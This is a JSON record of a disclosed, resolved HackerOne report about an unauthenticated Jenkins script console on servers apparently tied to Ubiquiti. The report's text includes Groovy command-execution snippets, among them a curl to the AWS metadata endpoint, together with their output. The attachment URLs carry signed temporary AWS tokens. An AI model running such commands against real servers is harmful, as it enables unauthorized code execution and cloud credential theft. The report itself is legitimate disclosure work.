@@ -1,0 +1,163 @@
+{
+  "id": 403402,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDM0MDI=",
+  "url": "https://hackerone.com/reports/403402",
+  "title": "Public Jenkins instance with /script enabled",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-08-31T12:05:04.584Z",
+  "submitted_at": "2018-08-31T12:05:04.584Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "smiegles",
+    "url": "/smiegles",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/045/1828acf6bd0443abccd1796fb54be386d874708c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 800,
+    "url": "https://hackerone.com/ui",
+    "handle": "ui",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ubiquiti Inc.",
+      "twitter_handle": "ubiquiti",
+      "website": "https://ui.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-09-10T16:21:17.097Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-09-08T23:40:55.136Z",
+  "team_member_agreed_on_going_public_at": "2018-09-10T16:21:16.815Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nFirst of all. I'm not 100% able to verify that this server is actually owned by Ubnt as there are multiple DNS Name's in the SSL certificate.\n\n```\nDNS Name: *.uum.com\nDNS Name: *.ubnt.com\nDNS Name: *.svc.ubnt.com\nDNS Name: *.api.uum.com\nDNS Name: *.svc.uum.com\nDNS Name: uum.com\n```\n\nSo, the server hosted on https://54.191.232.223/and https://54.186.253.37/is reachable from the internet and has the scirpt console enabled.\n\nYou can execute code on it by going to: https://54.186.253.37/script and insert the following code:\n\n```\n\"ls /\".execute().text\n```\n\n__result__\n````\nResult: bin\nboot\ndev\ndocker-java-home\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n```\n\nIt also allows reaching the AWS metadata server:\n\n```\n\"curl http://169.254.169.254/latest/meta-data/\".execute().text\n```\n\n__Result__\n\n```\nami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nhostname\niam/\ninstance-action\ninstance-id\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmetrics/\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups\nservices/\n```\n\n## Impact\n\nRCE\n\n{F340446}\n{F340447}",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 340446,
+      "file_name": "Screen_Shot_2018-08-31_at_14.04.12.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/340/446/377882861011c3919f7822ea1640af1d70d6d4ba/Screen_Shot_2018-08-31_at_14.04.12.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-08-31_at_14.04.12.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-08-31_at_14.04.12.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYBP46HO2%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T171921Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCID99h4%2BEQxNV2dRjwg3Mo0UDpirWezbqlTIHucXQggnNAiEAig6BgBvu7WZDDGJxCIlchaERLXvMr9mlkgBZpCQTBMEqsgUIGRADGgwwMTM2MTkyNzQ4NDkiDDXRRqgkClnguH%2BMqyqPBZDil1%2Fb5UYB47NbovfxaOyjXvSu%2Fdw6AR9p8bOa7u7UhHWe%2B8yPO0chekusb0gu3j9PHARtdjK4Y9eUkAyeQw%2B63vnmlLcELSy%2BA95agklhPmyf39SWuKgIUXobXIx7387cGLfA%2BKJTdlc5XFKmmAK00TLXejGyHdyrUlYfkQbozrvDmh9HWJHvHiqZ7HKM6UUuhjOj7nISKAIZjo%2BDGvvBPQgxdmMvgQ6SZ1bhBIUexYhgSa81oi3DDq6cNMVV%2FaJ8f1jv7Oq9xhgiVKDOaawHC5s0cdyBvTZzlVGzC9psSfqlZP%2BwGedFWyc34ba7KDje7NlJAEE5emSje8%2FGzx9p9ED2CJJ2YoJsMCjWhdW86apE2%2B2ej2O2Z2Oo7amzIF2JMVRnkJwpA6b4ukmOn65zGUZAkLsqUz2VhOmowR4XRvy8YblxiQ6VgDJYhBNyBKYyZYudy4AfI5smAEHoRPlyoIBkkLWzLoAasOlw0JEn8lO1zoYCrQGt%2BXeoYanaX0xoCsMOBtcfR2BeXrel6bk3KBabBQ1rGnR1RbAyC40YLmWVb2xd0dtCaBfK9rxm27t8HbLfrdcp075Jn7lfzg8PmnULdq0jkXsnJkt2n3aM8vlOtyRdINZPeC8Xfwy9bpB8MOo4xfmVsbcNylITA3SJUA92karcwKfTtlUhBrazwkZNV%2Fepw7lyIr4ksBFKDkmDEs1UOTHER4tBeSw%2Br%2FD09ThxeP4h7YSRW5NCF0%2FY4YaShcaPFEYD862zk2kAKB4Cp40ULOIgvMGnBUk22RluMpl4Uz08xyMv1x%2FA926On2Gr1Ehhe0EyBGssbtTDsaVaq0MNbDuU9fHrLAGEx1aDudfpi%2Fhc70H06GR8k18w8b%2FAxgY6sQGbwQQ0i%2B6YPSnMFT2%2BnO5wL4EltGZUFeUUTEqiO0y%2Be4sbAJNSPJ4Yu%2F7%2Fs1nxCVHevuR5mCkqgxrGKgrTH6e4InbpPZYHpyS2Zom0TB11squ93C%2FPqineuczGaAgw5IRK%2BPqci8Boxff5E1g4vzeQ6ibvqbw7fC7UYyPK%2FFCZeWyvPSqjUUPuXPPclnTY5O3RroQ2GakFKSQecuS4OZYbA9rM9zJ7O09Lbid8jyr9YcU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=21239319cad5a7ffa85d3e371777a5a8d2e96e4c5c77f7b8bf9d431f9ac5e5a4",
+      "file_size": 504299,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 340447,
+      "file_name": "Screen_Shot_2018-08-31_at_14.04.26.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/340/447/773cf42109a6b3280681f1d6dfc266b0e21997ad/Screen_Shot_2018-08-31_at_14.04.26.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-08-31_at_14.04.26.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-08-31_at_14.04.26.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYBP46HO2%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T171921Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCID99h4%2BEQxNV2dRjwg3Mo0UDpirWezbqlTIHucXQggnNAiEAig6BgBvu7WZDDGJxCIlchaERLXvMr9mlkgBZpCQTBMEqsgUIGRADGgwwMTM2MTkyNzQ4NDkiDDXRRqgkClnguH%2BMqyqPBZDil1%2Fb5UYB47NbovfxaOyjXvSu%2Fdw6AR9p8bOa7u7UhHWe%2B8yPO0chekusb0gu3j9PHARtdjK4Y9eUkAyeQw%2B63vnmlLcELSy%2BA95agklhPmyf39SWuKgIUXobXIx7387cGLfA%2BKJTdlc5XFKmmAK00TLXejGyHdyrUlYfkQbozrvDmh9HWJHvHiqZ7HKM6UUuhjOj7nISKAIZjo%2BDGvvBPQgxdmMvgQ6SZ1bhBIUexYhgSa81oi3DDq6cNMVV%2FaJ8f1jv7Oq9xhgiVKDOaawHC5s0cdyBvTZzlVGzC9psSfqlZP%2BwGedFWyc34ba7KDje7NlJAEE5emSje8%2FGzx9p9ED2CJJ2YoJsMCjWhdW86apE2%2B2ej2O2Z2Oo7amzIF2JMVRnkJwpA6b4ukmOn65zGUZAkLsqUz2VhOmowR4XRvy8YblxiQ6VgDJYhBNyBKYyZYudy4AfI5smAEHoRPlyoIBkkLWzLoAasOlw0JEn8lO1zoYCrQGt%2BXeoYanaX0xoCsMOBtcfR2BeXrel6bk3KBabBQ1rGnR1RbAyC40YLmWVb2xd0dtCaBfK9rxm27t8HbLfrdcp075Jn7lfzg8PmnULdq0jkXsnJkt2n3aM8vlOtyRdINZPeC8Xfwy9bpB8MOo4xfmVsbcNylITA3SJUA92karcwKfTtlUhBrazwkZNV%2Fepw7lyIr4ksBFKDkmDEs1UOTHER4tBeSw%2Br%2FD09ThxeP4h7YSRW5NCF0%2FY4YaShcaPFEYD862zk2kAKB4Cp40ULOIgvMGnBUk22RluMpl4Uz08xyMv1x%2FA926On2Gr1Ehhe0EyBGssbtTDsaVaq0MNbDuU9fHrLAGEx1aDudfpi%2Fhc70H06GR8k18w8b%2FAxgY6sQGbwQQ0i%2B6YPSnMFT2%2BnO5wL4EltGZUFeUUTEqiO0y%2Be4sbAJNSPJ4Yu%2F7%2Fs1nxCVHevuR5mCkqgxrGKgrTH6e4InbpPZYHpyS2Zom0TB11squ93C%2FPqineuczGaAgw5IRK%2BPqci8Boxff5E1g4vzeQ6ibvqbw7fC7UYyPK%2FFCZeWyvPSqjUUPuXPPclnTY5O3RroQ2GakFKSQecuS4OZYbA9rM9zJ7O09Lbid8jyr9YcU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5e9e533030e1233b30cec25be7e8647409307282d89c9e8762f813dbc3b7be72",
+      "file_size": 587086,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-10-08T23:40:55.349Z",
+  "allow_singular_disclosure_after": -219433105.96304157,
+  "singular_disclosure_allowed": true,
+  "vote_count": 74,
+  "voters": [
+    "chux",
+    "dyuen",
+    "mirchr",
+    "arneswinnen",
+    "fdeleite",
+    "p1stachios",
+    "mashoud1122",
+    "bogdantc",
+    "smiegles",
+    "ali",
+    "and 64 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 4110,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.ubnt.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 10445,
+      "category": "researcher",
+      "content": "Ubiquiti exposed a Jenkins server on the internet without any authentication, this allowed me to reach the AWS metadata service and execute code on the server itself. They resolved the issue and rewarded a bounty within 30 minutes of reporting, really impressive.  ",
+      "updated_at": "2018-09-10T14:57:23.553Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 45,
+        "username": "smiegles",
+        "name": "Olivier Beg",
+        "bio": "GET /server-status HTTP/1.1",
+        "cleared": true,
+        "verified": true,
+        "website": "https://olivierbeg.com",
+        "location": "@smiegles |  Amsterdam / The Netherlands",
+        "created_at": "2013-10-31T19:30:28.406Z",
+        "url": "https://hackerone.com/smiegles",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/045/1828acf6bd0443abccd1796fb54be386d874708c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/045/1828acf6bd0443abccd1796fb54be386d874708c_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/000/045/1828acf6bd0443abccd1796fb54be386d874708c_original.png/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    }
+  ]
+}
